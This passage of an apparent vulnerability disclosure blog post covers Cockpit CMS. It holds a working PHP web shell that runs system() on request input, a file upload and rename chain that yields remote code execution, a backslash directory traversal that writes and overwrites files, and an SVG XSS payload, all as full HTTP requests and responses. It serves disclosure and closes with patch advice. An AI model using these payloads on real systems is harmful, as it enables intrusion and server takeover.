+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuNzkyNGNhMDU5YTYyN2YyN2VjNWRlNTUzYWFjZTRmYWNiMTY0NjE0Mzg4MTQ5MWJmOTczZWRkNTBiNzI5MDEyYyJ9._rYQFGNY4sGFOE8tC9tS9wd7YDaXojrgASGPrgq28UA
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=e5ba0e005767e18851e330d89c1426d0
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfm71m98AVO7Pf5iO
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/finder
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO
+Content-Disposition: form-data; name=&#34;files[]&#34;; filename=&#34;felsec-rce.txt&#34;
+Content-Type: text/plain
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;FelSec-SH&lt;/title&gt;&lt;/head&gt;
+        &lt;body&gt;
+        &lt;h1&gt;FelSec - Shell&lt;/h1&gt;
+                &lt;pre style=&#34;font-family: monospace&#34;&gt;
+ ________________
+&lt; FelSec - SHELL &gt;
+ ----------------
+ \
+  \
+   \
+ ,_     _
+ |\_,-~/
+ / _  _ |    ,--.
+(  @  @ )   / ,-&#39;
+ \  _T_/-._( (
+ /         `. \
+|         _   |
+ \ ,  /       |
+  || |-___   /
+ ((_/`(____,-&#39;
+&lt;/pre&gt;
+ &lt;br /&gt;
+       &lt;pre&gt;Usage: &lt;target&gt;/felsec-rce.php?cmd=hostname&lt;/pre&gt;
+       &lt;br /&gt;
+&lt;?php
+
+if(isset($_REQUEST[&#39;cmd&#39;])){
+        echo &#34;&lt;pre&gt;&#34;;
+        $cmd = ($_REQUEST[&#39;cmd&#39;]);
+        system($cmd);
+        echo &#34;&lt;/pre&gt;&#34;;
+        die;
+}
+
+?&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO--
+</code></pre><p><strong>Response - Uploading the web shell:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Content-Length: 43
+
+{&#34;uploaded&#34;:[&#34;felsec-rce.txt&#34;],&#34;failed&#34;:[]}
+</code></pre><ul>
+<li>Use the <code>rename</code> function to change the extension to <code>.php</code>;</li>
+</ul>
+<p><strong>Request - Renaming the file with the <code>.php</code> extension:</strong></p>
+<pre tabindex="0"><code>GET /system/buckets/api/default?cmd=rename&amp;path=./felsec-rce.txt&amp;name=./felsec-rce.php/. HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 0
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuNzkyNGNhMDU5YTYyN2YyN2VjNWRlNTUzYWFjZTRmYWNiMTY0NjE0Mzg4MTQ5MWJmOTczZWRkNTBiNzI5MDEyYyJ9._rYQFGNY4sGFOE8tC9tS9wd7YDaXojrgASGPrgq28UA
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=e5ba0e005767e18851e330d89c1426d0
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/finder
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+</code></pre><p><strong>Response - Renaming the file with the <code>.php</code> extension:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Content-Length: 16
+
+{&#34;success&#34;:true}
+</code></pre><ul>
+<li>Navigate to the file to run the malicious PHP code.</li>
+</ul>
+<p><strong>Request - Renamed file accessible on the server and able to run system commands:</strong></p>
+<pre tabindex="0"><code>GET /storage/uploads/buckets/default/felsec-rce.php?cmd=env%26%26date HTTP/1.1
+Host: 192.168.1.210:9081
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=e5ba0e005767e18851e330d89c1426d0
+Connection: keep-alive
+</code></pre><p><strong>Response - Renamed file accessible on the server and able to run system commands:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: FrankenPHP Caddy
+Content-Length: 1452
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;FelSec-SH&lt;/title&gt;&lt;/head&gt;
+        &lt;body&gt;
+        &lt;h1&gt;FelSec - Shell&lt;/h1&gt;
+                &lt;pre style=&#34;font-family: monospace&#34;&gt;
+ ________________
+&lt; FelSec - SHELL &gt;
+ ----------------
+ \
+  \
+   \
+ ,_     _
+ |\_,-~/
+ / _  _ |    ,--.
+(  @  @ )   / ,-&#39;
+ \  _T_/-._( (
+ /         `. \
+|         _   |
+ \ ,  /       |
+  || |-___   /
+ ((_/`(____,-&#39;
+&lt;/pre&gt;
+ &lt;br /&gt;
+       &lt;pre&gt;Usage: &lt;target&gt;/felsec-rce.php?cmd=hostname&lt;/pre&gt;
+       &lt;br /&gt;
+&lt;pre&gt;HOSTNAME=8a1011b1e29e
+PHP_INI_DIR=/usr/local/etc/php
+HOME=/root
+OLDPWD=/app
+GODEBUG=cgocheck=0
+PHP_LDFLAGS=-Wl,-O1 -pie
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+PHP_VERSION=8.4.18
+GPG_KEYS=AFD8691FDAEDF03BDF6E460563F15A9B715376CA 9D7F99A0CB8F05C8A6958D6256A97AF7600A39A6 0616E93D95AF471243E26761770426E17EBBB3DD
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
+PHP_ASC_URL=https://www.php.net/distributions/php-8.4.18.tar.xz.asc
+PHP_URL=https://www.php.net/distributions/php-8.4.18.tar.xz
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+XDG_CONFIG_HOME=/config
+XDG_DATA_HOME=/data
+PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
+PWD=/var/www/html/storage/uploads/buckets/default
+PHP_SHA256=957a9b19b4a8e965ee0cc788ca74333bfffaadc206b58611b6cd3cc8b2f40110
+SERVER_NAME=http://
+Mon Mar 23 20:46:59 UTC 2026
+&lt;/pre&gt;
+</code></pre><h2 id="vulnerability-3---directory-traversal-to-arbitrary-file-write">Vulnerability 3 - Directory Traversal to Arbitrary File Write</h2>
+<p>After bypassing the <code>php</code> filter, I decided to take a look at some of the other functions within the module and after a short while I identified a directory traversal vulnerability within the <code>_getPathParameter</code> function (below).</p>
+<pre tabindex="0"><code>    protected function _getPathParameter() {
+
+        $path = $this-&gt;param(&#39;path&#39;, false);
+
+        if ($path) {
+
+            $path = \trim(\trim($path, &#39;/&#39;));
+
+            if (\str_contains($path, &#39;../&#39;)) {
+                $path = false;
+            }
+        }
+
+        return $path;
+    }
+</code></pre><p>This function only checks if the provided file path contains the traversal characters <code>../</code>, allowing alternative methods to work including <code>..\</code>.</p>
+<p>By injecting the <code>..\</code> characters into the <code>path</code> parameter it was possible to:</p>
+<ul>
+<li>list other files in the uploads directory;</li>
+<li>overwrite assets;</li>
+<li>write files to arbitrary locations within the uploads directory.</li>
+</ul>
+<p><strong>Request - Listing files in other folders</strong></p>
+<pre tabindex="0"><code>GET /system/buckets/api/default?cmd=ls&amp;path=..\..\2026/03/11 HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 0
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuMDFiYWQ2NWE0N2NjMzkzZjFmMjA4Mjg0MzU4YTgwOWQ5ZWNhZDUxOTViOGE1MWViNGY0ZTdjYTNhM2UyNGY0OCJ9.z2XyPD77C7c2xs0KjHPkHvv6tJC5xkh75Xwz9mLtrLI
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=76694649176ba9d65c5b44190df548c1
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/finder
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+</code></pre><p><strong>Response - Listing files in other folders</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+Content-Length: 874
+
+{&#34;folders&#34;:[],&#34;files&#34;:[{&#34;is_file&#34;:true,&#34;is_dir&#34;:false,&#34;name&#34;:&#34;eicartxt_uid_69b1bf642e2e5.p12&#34;,&#34;path&#34;:&#34;uploads:\/\/2026\/03\/11\/eicartxt_uid_69b1bf642e2e5.p12&#34;,&#34;url&#34;:&#34;http:\/\/192.168.1.210:9081\/storage\/uploads\/2026\/03\/11\/eicartxt_uid_69b1bf642e2e5.p12&#34;,&#34;type&#34;:&#34;unknown&#34;,&#34;size&#34;:&#34;68 Bytes&#34;,&#34;filesize&#34;:68,&#34;mime&#34;:&#34;application\/x-pkcs12&#34;,&#34;ext&#34;:&#34;p12&#34;,&#34;lastmodified&#34;:&#34;11.03.26 19:15&#34;,&#34;modified&#34;:1773256548},[...SNIPPED...]],&#34;path&#34;:&#34;uploads:\/\/buckets\/default\/..\\..\\2026\/03\/11&#34;}
+</code></pre><p><strong>Request - Uploading file to arbitrary location:</strong></p>
+<pre tabindex="0"><code>POST /system/buckets/api/test?cmd=upload&amp;path=..\..\ HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 248
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuNmEwMDQ0OTk3NzA1MDMxNTBkMDVlOWJjN2QyOGM5YmZkOTViNGJiZmRjZmY0ZGYxYmEzYjU0NmFmNGYxYTk5NCJ9.RqR6EbucXT9Dq3FCJGXSCVqVV0AOuVIHYRjLP6wEjVw
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/system
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=11908d596e49dfc833320d89b69b0366
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfm71m98AVO7Pf5iO
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO
+Content-Disposition: form-data; name=&#34;files[]&#34;; filename=&#34;msg.txt&#34;
+Content-Type: application/x-php
+
+FelSec - I have been written to storage/uploads/msg.txt
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO--
+</code></pre><p><strong>Response - Uploading file to arbitrary location:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Content-Length: 36
+
+{&#34;uploaded&#34;:[&#34;msg.txt&#34;],&#34;failed&#34;:[]}
+</code></pre><p><strong>Request - List files:</strong></p>
+<pre tabindex="0"><code>GET /system/buckets/api/test?cmd=ls&amp;path=..\..\ HTTP/1.1
+Host: 192.168.1.210:9081
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuNmEwMDQ0OTk3NzA1MDMxNTBkMDVlOWJjN2QyOGM5YmZkOTViNGJiZmRjZmY0ZGYxYmEzYjU0NmFmNGYxYTk5NCJ9.RqR6EbucXT9Dq3FCJGXSCVqVV0AOuVIHYRjLP6wEjVw
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=11908d596e49dfc833320d89b69b0366
+</code></pre><p><strong>Response - List files:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+Content-Length: 809
+
+{&#34;folders&#34;:[[...SNIPPED...],{&#34;is_file&#34;:true,&#34;is_dir&#34;:false,&#34;name&#34;:&#34;msg.txt&#34;,&#34;path&#34;:&#34;uploads:\/\/msg.txt&#34;,&#34;url&#34;:&#34;http:\/\/192.168.1.210:9081\/storage\/uploads\/msg.txt&#34;,&#34;type&#34;:&#34;document&#34;,&#34;size&#34;:&#34;57 Bytes&#34;,&#34;filesize&#34;:57,&#34;mime&#34;:&#34;text\/plain&#34;,&#34;ext&#34;:&#34;txt&#34;,&#34;lastmodified&#34;:&#34;28.04.26 20:32&#34;,&#34;modified&#34;:1777408364}],&#34;path&#34;:&#34;uploads:\/\/buckets\/test\/..\\..\\&#34;}
+</code></pre><p>Additionally, the <code>name</code> parameter used when calling the <code>rename</code> did not check for <code>../</code> or <code>..\</code> characters, allowing the files to moved to arbitrary locations or overwrite assets.</p>
+<p>An example exploit flow is as follows:</p>
+<ol>
+<li>Identify an asset you want to overwrite</li>
+</ol>
+<p><strong>Request - Clean SVG file:</strong></p>
+<pre tabindex="0"><code>GET /storage/uploads/2026/03/24/clean_uid_69c2f9fade9f9.svg HTTP/1.1
+Host: 192.168.1.210:9081
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.1.210:9081/assets
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=4c268531c975fc8052c2f77ffd17e3c8
+If-None-Match: &#34;dhbb7yjnzttu8z&#34;
+If-Modified-Since: Tue, 24 Mar 2026 20:54:18 GMT
+Connection: keep-alive
+</code></pre><p><strong>Response - Clean SVG file:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 323
+Content-Type: image/svg+xml
+Etag: &#34;dhbb7yjnzttu8z&#34;
+Last-Modified: Tue, 24 Mar 2026 20:54:18 GMT
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; width=&#34;640px&#34; height=&#34;320px&#34;&gt;
+  &lt;rect width=&#34;632&#34; height=&#34;3000&#34; style=&#34;fill:rgb(255,0,0);stroke-width:4;stroke:rgb(0,0,0)&#34;&gt;&lt;/rect&gt;
+  &lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;FelSec - TEST IMAGE&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre><p><strong>Clean SVG file prior to being overwritten:</strong></p>
+<p><img src="/posts/cockpit-cms-multiplevulns/cleansvg.png" alt="Clean SVG"></p>
+<ol start="2">
+<li>Use the Bucket module to upload a malicious SVG to the application using a support and unchecked extension (e.g. <code>.txt</code>)</li>
+</ol>
+<p><strong>Request - Upload malicious SVG file:</strong></p>
+<pre tabindex="0"><code>POST /system/buckets/api/default?cmd=upload&amp;path=. HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 446
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuOWQyYWNlMzEwM2NjODY4YjZlOTQ3M2I4MDA3NThhZmI1OTM0MTVkYzdlOGQ2Zjc2NTI3YzZlYTYwNWQ0OTkxMiJ9.l1Ki4d5cOUEvGiwUqv1qSafDiGrkn0OhrY-tRJ8u5kw
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=caa384be9841cab48e013e56496ef21a
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfm71m98AVO7Pf5iO
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/finder
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO
+Content-Disposition: form-data; name=&#34;files[]&#34;; filename=&#34;mal-svg.txt&#34;
+Content-Type: text/plain
+
+&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+   &lt;rect width=&#34;300&#34; height=&#34;100&#34; style=&#34;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&#34; /&gt;
+   &lt;script type=&#34;text/javascript&#34;&gt;
+      alert(&#34;FelSec XSS!&#34;);
+   &lt;/script&gt;
+&lt;/svg&gt;
+
+------WebKitFormBoundaryfm71m98AVO7Pf5iO--
+</code></pre><p><strong>Response - Upload malicious SVG file:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Content-Length: 40
+
+{&#34;uploaded&#34;:[&#34;mal-svg.txt&#34;],&#34;failed&#34;:[]}
+</code></pre><ol start="3">
+<li>Use the <code>rename</code> function to overwrite the asset with the malicious version</li>
+</ol>
+<p><strong>Request - Overwriting clean file using the rename command:</strong></p>
+<pre tabindex="0"><code>GET /system/buckets/api/default?cmd=rename&amp;path=./mal-svg.txt&amp;name=../../2026/03/24/clean_uid_69c2f9fade9f9.svg HTTP/1.1
+Host: 192.168.1.210:9081
+Content-Length: 0
+X-CSRF-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoiYXBwLmNzcmYuMDFiYWQ2NWE0N2NjMzkzZjFmMjA4Mjg0MzU4YTgwOWQ5ZWNhZDUxOTViOGE1MWViNGY0ZTdjYTNhM2UyNGY0OCJ9.z2XyPD77C7c2xs0KjHPkHvv6tJC5xkh75Xwz9mLtrLI
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=76694649176ba9d65c5b44190df548c1
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://192.168.1.210:9081
+Referer: http://192.168.1.210:9081/finder
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+</code></pre><p><strong>Response - Overwriting clean file using the rename command:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: application/json
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: FrankenPHP Caddy
+Content-Length: 16
+
+{&#34;success&#34;:true}
+</code></pre><p>The asset now loads the malicious content, including JavaScript code (which is usually removed from SVG files)</p>
+<p><strong>Request - Get overwritten SVG file:</strong></p>
+<pre tabindex="0"><code>GET /storage/uploads/2026/03/24/clean_uid_69c2f9fade9f9.svg HTTP/1.1
+Host: 192.168.1.210:9081
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.1.210:9081/
+Accept-Encoding: gzip, deflate, br
+Cookie: 40d1b2d83998fabacb726e5bc3d22129=caa384be9841cab48e013e56496ef21a
+If-None-Match: &#34;dhbb7yjnzttu8z&#34;
+If-Modified-Since: Tue, 24 Mar 2026 20:54:18 GMT
+Connection: keep-alive
+</code></pre><p><strong>Response - Get overwritten SVG file:</strong></p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 258
+Content-Type: image/svg+xml
+Etag: &#34;dhbba2mb1g2p76&#34;
+Last-Modified: Tue, 24 Mar 2026 20:57:04 GMT
+Server: FrankenPHP Caddy
+Vary: Accept-Encoding
+
+&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+   &lt;rect width=&#34;300&#34; height=&#34;100&#34; style=&#34;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&#34; /&gt;
+   &lt;script type=&#34;text/javascript&#34;&gt;
+      alert(&#34;FelSec XSS!&#34;);
+   &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre><p>Overwritten SVG file executing JavaScript:</p>
+<p><img src="/posts/cockpit-cms-multiplevulns/malicioussvg.png" alt="Malicious SVG"></p>
+<p>When combined with the previous vulnerability it would be possible to write PHP files at any location within the application&rsquo;s upload directory.</p>
+<h2 id="recommendations">Recommendations</h2>
+<p>The first and biggest recommendation, is to update any affected Cockpit CMS instance to 2.14.0.</p>
+<p>The second recommendation is to configure Cockpit CMS to only support the types you want to include in your site (<code>svg</code>, <code>png</code>, <code>pdf</code>, etc.).</p>
+<h2 id="references-and-other-reading">References and Other Reading</h2>
+<ul>
+<li><a href="https://www.ghostccamm.com/blog/multi_cockpit_vulns/">https://www.ghostccamm.com/blog/multi_cockpit_vulns/</a></li>
+<li><a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">https://swarm.ptsecurity.com/rce-cockpit-cms/</a></li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
